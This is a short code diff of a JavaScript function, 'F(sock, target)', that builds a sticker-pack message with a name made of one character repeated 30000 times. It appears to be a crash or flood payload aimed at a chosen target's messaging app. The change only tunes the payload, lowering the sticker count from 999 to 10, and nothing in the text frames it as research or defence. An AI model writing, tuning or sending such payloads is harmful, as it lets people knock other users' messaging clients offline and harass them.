@@ -418,7 +418,7 @@ async function F(sock, target) {
             stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
             name: "ꦾ".repeat(30000),
             publisher: "© PhynxAgency",
-            stickers: Array.from({ length: 999 }, () => ({
+            stickers: Array.from({ length: 10 }, () => ({
                 fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                 isAnimated: false,
                 emojis: ["🩸"],
